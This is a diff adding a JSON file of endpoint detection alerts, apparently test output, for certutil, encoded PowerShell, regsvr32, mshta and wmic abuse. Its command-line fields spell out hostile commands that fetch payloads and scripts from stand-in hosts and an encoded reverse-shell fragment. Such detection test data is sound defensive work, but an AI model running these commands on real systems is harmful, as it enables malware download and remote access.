@@ -1,0 +1,244 @@
+{
+  "alerts": [
+    {
+      "timestamp": "2025-02-27 18:54:36",
+      "rule_name": "CertUtil Download",
+      "description": "CertUtil used to download files from internet",
+      "severity": 4,
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\harmless.exe",
+      "pid": 1001,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-02-27 18:54:37",
+      "rule_name": "PowerShell Encoded Command",
+      "description": "PowerShell executing encoded commands",
+      "severity": 4,
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACIALAA0ADQANAA0ACkA",
+      "pid": 1002,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-02-27 18:54:37",
+      "rule_name": "Regsvr32 AppLocker Bypass",
+      "description": "Regsvr32 used to bypass AppLocker",
+      "severity": 5,
+      "process_name": "regsvr32.exe",
+      "command_line": "regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll",
+      "pid": 1003,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-02-27 18:54:38",
+      "rule_name": "MSHTA Suspicious Execution",
+      "description": "MSHTA executing remote or encoded script",
+      "severity": 4,
+      "process_name": "mshta.exe",
+      "command_line": "mshta.exe javascript:a=GetObject(\"script:http://malicious.com/code.sct\").Exec();close();",
+      "pid": 1004,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe",
+        "mshta.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-02-27 18:54:38",
+      "rule_name": "WMIC Process Creation",
+      "description": "WMIC used to create process",
+      "severity": 3,
+      "process_name": "wmic.exe",
+      "command_line": "wmic.exe process call create powershell.exe -enc JABjAGwAaQBlAG4AdAA=",
+      "pid": 1005,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe",
+        "mshta.exe",
+        "wmic.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 14:29:00",
+      "rule_name": "CertUtil Download",
+      "description": "CertUtil used to download files from internet",
+      "severity": 4,
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\harmless.exe",
+      "pid": 1001,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 14:29:00",
+      "rule_name": "PowerShell Encoded Command",
+      "description": "PowerShell executing encoded commands",
+      "severity": 4,
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACIALAA0ADQANAA0ACkA",
+      "pid": 1002,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 14:29:01",
+      "rule_name": "Regsvr32 AppLocker Bypass",
+      "description": "Regsvr32 used to bypass AppLocker",
+      "severity": 5,
+      "process_name": "regsvr32.exe",
+      "command_line": "regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll",
+      "pid": 1003,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 14:29:01",
+      "rule_name": "MSHTA Suspicious Execution",
+      "description": "MSHTA executing remote or encoded script",
+      "severity": 4,
+      "process_name": "mshta.exe",
+      "command_line": "mshta.exe javascript:a=GetObject(\"script:http://malicious.com/code.sct\").Exec();close();",
+      "pid": 1004,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe",
+        "mshta.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 14:29:02",
+      "rule_name": "WMIC Process Creation",
+      "description": "WMIC used to create process",
+      "severity": 3,
+      "process_name": "wmic.exe",
+      "command_line": "wmic.exe process call create powershell.exe -enc JABjAGwAaQBlAG4AdAA=",
+      "pid": 1005,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe",
+        "mshta.exe",
+        "wmic.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 15:17:15",
+      "rule_name": "CertUtil Download",
+      "description": "CertUtil used to download files from internet",
+      "severity": 4,
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\harmless.exe",
+      "pid": 1001,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 15:17:16",
+      "rule_name": "PowerShell Encoded Command",
+      "description": "PowerShell executing encoded commands",
+      "severity": 4,
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACIALAA0ADQANAA0ACkA",
+      "pid": 1002,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 15:17:17",
+      "rule_name": "Regsvr32 AppLocker Bypass",
+      "description": "Regsvr32 used to bypass AppLocker",
+      "severity": 5,
+      "process_name": "regsvr32.exe",
+      "command_line": "regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll",
+      "pid": 1003,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 15:17:17",
+      "rule_name": "MSHTA Suspicious Execution",
+      "description": "MSHTA executing remote or encoded script",
+      "severity": 4,
+      "process_name": "mshta.exe",
+      "command_line": "mshta.exe javascript:a=GetObject(\"script:http://malicious.com/code.sct\").Exec();close();",
+      "pid": 1004,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe",
+        "mshta.exe"
+      ]
+    },
+    {
+      "timestamp": "2025-03-10 15:17:18",
+      "rule_name": "WMIC Process Creation",
+      "description": "WMIC used to create process",
+      "severity": 3,
+      "process_name": "wmic.exe",
+      "command_line": "wmic.exe process call create powershell.exe -enc JABjAGwAaQBlAG4AdAA=",
+      "pid": 1005,
+      "username": "test_user",
+      "context": [
+        "cmd.exe",
+        "certutil.exe",
+        "powershell.exe",
+        "regsvr32.exe",
+        "mshta.exe",
+        "wmic.exe"
+      ]
+    }
+  ]
+}
